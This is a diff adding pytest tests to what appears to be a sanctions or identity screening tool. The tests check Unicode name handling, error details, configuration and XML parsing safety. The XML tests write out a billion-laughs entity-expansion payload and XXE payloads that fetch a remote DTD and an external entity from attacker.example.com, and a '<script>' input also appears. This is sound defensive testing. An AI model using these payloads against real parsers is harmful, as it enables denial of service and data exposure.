@@ -706,5 +706,304 @@ class TestSecurityValidation:
             pass
 
 
+class TestUnicodeNameSupport:
+    """Tests for international name support"""
+    
+    def test_chinese_name(self):
+        """Test Chinese name validation"""
+        from screener import ScreeningInput, validate_screening_input
+        
+        input_data = ScreeningInput(name="李明")
+        validate_screening_input(input_data)  # Should not raise
+    
+    def test_arabic_name(self):
+        """Test Arabic name validation"""
+        from screener import ScreeningInput, validate_screening_input
+        
+        input_data = ScreeningInput(name="محمد علي")
+        validate_screening_input(input_data)  # Should not raise
+    
+    def test_cyrillic_name(self):
+        """Test Cyrillic name validation"""
+        from screener import ScreeningInput, validate_screening_input
+        
+        input_data = ScreeningInput(name="Владимир")
+        validate_screening_input(input_data)  # Should not raise
+    
+    def test_mixed_script_name(self):
+        """Test mixed Latin/accented name validation"""
+        from screener import ScreeningInput, validate_screening_input
+        
+        input_data = ScreeningInput(name="José María François")
+        validate_screening_input(input_data)  # Should not raise
+
+
+class TestDoSProtection:
+    """Tests for XML DoS attack prevention"""
+    
+    def test_billion_laughs_attack(self, tmp_path):
+        """Test that billion laughs attack is blocked"""
+        from xml_utils import secure_parse
+        
+        # Billion laughs payload
+        billion_laughs = '''<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<lolz>&lol3;</lolz>'''
+        
+        xml_file = tmp_path / "billion_laughs.xml"
+        xml_file.write_text(billion_laughs)
+        
+        # Should complete quickly without expansion
+        import time
+        start = time.time()
+        try:
+            tree, root = secure_parse(xml_file)
+            elapsed = time.time() - start
+            assert elapsed < 5  # Should not hang
+            # Entity should not be expanded
+            text = root.text or ''
+            assert 'lol' not in text.lower() or len(text) < 1000
+        except Exception:
+            # Parser rejected - also acceptable
+            pass
+    
+    def test_deeply_nested_xml(self, tmp_path):
+        """Test handling of deeply nested XML"""
+        from xml_utils import secure_parse
+        
+        # Create deeply nested XML (100 levels - reasonable limit)
+        depth = 100
+        xml = '<?xml version="1.0"?>'
+        xml += '<root>' + '<nested>' * depth + 'data' + '</nested>' * depth + '</root>'
+        
+        xml_file = tmp_path / "deep_nesting.xml"
+        xml_file.write_text(xml)
+        
+        # Should parse without hanging
+        try:
+            tree, root = secure_parse(xml_file)
+            # Should complete successfully or reject gracefully
+        except Exception:
+            pass  # Acceptable to reject deeply nested content
+
+
+class TestRemoteDTDProtection:
+    """Tests for remote DTD/entity retrieval prevention"""
+    
+    def test_remote_dtd_blocked(self, tmp_path):
+        """Test that remote DTD retrieval is blocked"""
+        from xml_utils import secure_parse
+        
+        remote_dtd = '''<?xml version="1.0"?>
+<!DOCTYPE root SYSTEM "http://attacker.example.com/evil.dtd">
+<root>data</root>'''
+        
+        xml_file = tmp_path / "remote_dtd.xml"
+        xml_file.write_text(remote_dtd)
+        
+        # Should parse without fetching remote DTD
+        try:
+            tree, root = secure_parse(xml_file)
+            # No network call should be made
+            assert root.text == 'data'
+        except Exception:
+            # Rejecting remote DTD entirely is also acceptable
+            pass
+    
+    def test_remote_entity_blocked(self, tmp_path):
+        """Test that remote entity retrieval is blocked"""
+        from xml_utils import secure_parse
+        
+        remote_entity = '''<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://attacker.example.com/data">
+]>
+<root>&xxe;</root>'''
+        
+        xml_file = tmp_path / "remote_entity.xml"
+        xml_file.write_text(remote_entity)
+        
+        try:
+            tree, root = secure_parse(xml_file)
+            # Entity should not contain remote data
+            text = root.text or ''
+            assert 'http' not in text
+        except Exception:
+            pass
+
+
+class TestControlCharacterHandling:
+    """Tests for control character sanitization"""
+    
+    def test_null_byte_removal(self):
+        """Test null byte is removed from logging"""
+        from xml_utils import sanitize_for_logging
+        
+        result = sanitize_for_logging("Name\x00WithNull")
+        assert '\x00' not in result
+        assert 'Name' in result
+        assert 'WithNull' in result
+    
+    def test_backspace_removal(self):
+        """Test backspace character is removed"""
+        from xml_utils import sanitize_for_logging
+        
+        result = sanitize_for_logging("Name\x08Backspace")
+        assert '\x08' not in result
+    
+    def test_bell_removal(self):
+        """Test bell character is removed"""
+        from xml_utils import sanitize_for_logging
+        
+        result = sanitize_for_logging("Name\x07Bell")
+        assert '\x07' not in result
+    
+    def test_ansi_escape_removal(self):
+        """Test ANSI escape sequences are removed"""
+        from xml_utils import sanitize_for_logging
+        
+        result = sanitize_for_logging("\x1b[31mRedText\x1b[0m")
+        assert '\x1b' not in result
+        assert 'RedText' in result
+    
+    def test_vertical_tab_removal(self):
+        """Test vertical tab is removed"""
+        from xml_utils import sanitize_for_logging
+        
+        result = sanitize_for_logging("Name\x0bVerticalTab")
+        assert '\x0b' not in result
+    
+    def test_form_feed_removal(self):
+        """Test form feed is removed"""
+        from xml_utils import sanitize_for_logging
+        
+        result = sanitize_for_logging("Name\x0cFormFeed")
+        assert '\x0c' not in result
+    
+    def test_high_unicode_preserved(self):
+        """Test that valid high Unicode is preserved"""
+        from xml_utils import sanitize_for_logging
+        
+        # Chinese characters should be preserved
+        result = sanitize_for_logging("Name 李明")
+        assert '李明' in result
+
+
+class TestEnhancedErrorMessages:
+    """Tests for enhanced error messages with details"""
+    
+    def test_error_includes_field(self):
+        """Test that error includes field name"""
+        from screener import ScreeningInput, validate_screening_input, InputValidationError
+        
+        input_data = ScreeningInput(name="A")
+        try:
+            validate_screening_input(input_data)
+            assert False, "Should have raised"
+        except InputValidationError as e:
+            assert e.field == "name"
+            assert e.code == "NAME_TOO_SHORT"
+    
+    def test_error_includes_suggestion(self):
+        """Test that error includes suggestion"""
+        from screener import ScreeningInput, validate_screening_input, InputValidationError
+        
+        input_data = ScreeningInput(name="<script>")
+        try:
+            validate_screening_input(input_data)
+            assert False, "Should have raised"
+        except InputValidationError as e:
+            assert e.suggestion != ""
+    
+    def test_dob_error_includes_example(self):
+        """Test that DOB error includes format example"""
+        from screener import ScreeningInput, validate_screening_input, InputValidationError
+        
+        input_data = ScreeningInput(name="John Doe", date_of_birth="invalid")
+        try:
+            validate_screening_input(input_data)
+            assert False, "Should have raised"
+        except InputValidationError as e:
+            assert "YYYY-MM-DD" in str(e) or "1980-01-15" in str(e)
+
+
+class TestConfigurableValidation:
+    """Tests for configuration-based validation"""
+    
+    def test_config_name_min_length(self, tmp_path):
+        """Test configurable minimum name length"""
+        from config_manager import ConfigManager
+        
+        config_content = """
+matching:
+  name_threshold: 85
+  weights:
+    name: 0.40
+    document: 0.30
+    dob: 0.15
+    nationality: 0.10
+    address: 0.05
+
+input_validation:
+  name_min_length: 5
+  name_max_length: 200
+  document_max_length: 50
+  allow_unicode_names: true
+  blocked_characters: "<>"
+
+reporting:
+  recommendation_thresholds:
+    auto_clear: 60
+    manual_review: 85
+    auto_escalate: 95
+"""
+        config_file = tmp_path / "config.yaml"
+        config_file.write_text(config_content)
+        
+        ConfigManager.reset_instance()
+        config = ConfigManager(str(config_file))
+        
+        assert config.input_validation.name_min_length == 5
+    
+    def test_config_unicode_disabled(self, tmp_path):
+        """Test disabling Unicode names via config"""
+        from config_manager import ConfigManager
+        
+        config_content = """
+matching:
+  name_threshold: 85
+  weights:
+    name: 0.40
+    document: 0.30
+    dob: 0.15
+    nationality: 0.10
+    address: 0.05
+
+input_validation:
+  name_min_length: 2
+  name_max_length: 200
+  document_max_length: 50
+  allow_unicode_names: false
+  blocked_characters: "<>"
+
+reporting:
+  recommendation_thresholds:
+    auto_clear: 60
+    manual_review: 85
+    auto_escalate: 95
+"""
+        config_file = tmp_path / "config.yaml"
+        config_file.write_text(config_content)
+        
+        ConfigManager.reset_instance()
+        config = ConfigManager(str(config_file))
+        
+        assert config.input_validation.allow_unicode_names is False
+
+
 if __name__ == "__main__":
     pytest.main([__file__, "-v"])
